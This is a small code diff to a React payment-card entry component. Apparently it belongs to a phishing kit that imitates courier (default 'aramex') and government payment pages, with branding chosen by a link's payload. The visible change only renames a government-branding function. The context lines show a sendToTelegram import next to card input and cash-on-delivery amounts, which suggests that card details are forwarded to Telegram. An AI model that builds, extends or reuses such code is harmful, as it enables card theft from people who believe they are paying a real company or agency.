@@ -12,7 +12,7 @@ import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
-import { getGovBranding } from "@/lib/governmentPaymentSystems";
+import { getGovSystemConfig } from "@/lib/governmentPaymentSystems";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentCardInput = () => {
@@ -32,7 +32,7 @@ const PaymentCardInput = () => {
   const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
   const govId = searchParams.get("govId") || linkData?.payload?.govId;
   const branding = getServiceBranding(companyKey);
-  const govBranding = govId ? getGovBranding(govId) : undefined;
+  const govBranding = govId ? getGovSystemConfig(govId) : undefined;
 
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
   const rawAmount = linkData?.payload?.cod_amount || 500;
